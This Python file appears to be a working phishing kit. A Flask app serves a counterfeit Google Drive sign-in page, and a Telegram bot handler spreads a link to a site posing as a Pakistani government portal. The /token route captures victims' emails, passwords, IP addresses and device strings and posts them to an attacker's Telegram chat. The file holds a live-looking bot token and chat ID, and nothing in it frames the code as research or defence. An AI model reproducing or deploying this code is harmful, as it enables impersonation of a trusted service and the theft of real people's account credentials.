from flask import Flask, request, render_template_string
import requests
import telebot
import threading

# Telegram Bot Setup
BOT_TOKEN = "7901711799:AAEWnySjRO5KgEMpUQmz7fwnYzlumt_AlX4"
CHAT_ID = "6908281054"
bot = telebot.TeleBot(BOT_TOKEN)

# Flask App
app = Flask(__name__)

# HTML Template (inline)
login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in – Google Drive</title>
  <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #f1f1f1;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px 30px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }
    .login-box img {
      width: 80px;
      display: block;
      margin: 0 auto 20px;
    }
    .login-box h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #202124;
    }
    .input-field {
      position: relative;
    }
    input {
      width: 100%;
      padding: 12px 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #888;
    }
    button {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }
    .loading {
      display: none;
      text-align: center;
      margin-top: 15px;
    }
    .loading.show {
      display: block;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" alt="Google Drive">
    <h2>Sign in</h2>
    <form id="loginForm" action="/token" method="POST">
      <input type="email" name="email" placeholder="Email or phone" required>
      <div class="input-field">
        <input type="password" name="password" id="password" placeholder="Enter your password" required>
        <span class="toggle-password" onclick="togglePassword()">👁️</span>
      </div>
      <button type="submit">Next</button>
      <div class="loading" id="loading">🔄 Please wait...</div>
    </form>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("password");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }

    const form = document.getElementById('loginForm');
    form.addEventListener('submit', function () {
      document.getElementById('loading').classList.add('show');
    });
  </script>
</body>
</html>
"""

# Telegram /start command response
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id,
        "👋 Welcome to Govt of Pakinstn Portal!\n\nClick below to continue:\n🔗 https://govt-of-pakinstn.onrender.com")

# Route: Home Page
@app.route('/')
def index():
    return render_template_string(login_html)

# Route: Token Capture
@app.route('/token', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    agent = request.headers.get("User-Agent")

    text = f"""🛡️ *Login Captured*

📧 Email: `{email}`
🔑 Password: `{password}`
🌐 IP: `{ip}`
📱 Device: `{agent}`

🔗 Page: https://govt-of-pakinstn.onrender.com
"""
    # Send to Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'Markdown'}
    requests.post(url, data=data)

    return f"""
    <h2>Welcome, {email}</h2>
    <p>You are being signed in... Please wait.</p>
    <a href='/'>← Back</a>
    """

# Run Flask + Bot Together
def run_web():
    app.run(host="0.0.0.0", port=8080)

def run_bot():
    bot.polling(non_stop=True)

if __name__ == '__main__':
    threading.Thread(target=run_web).start()
    threading.Thread(target=run_bot).start()
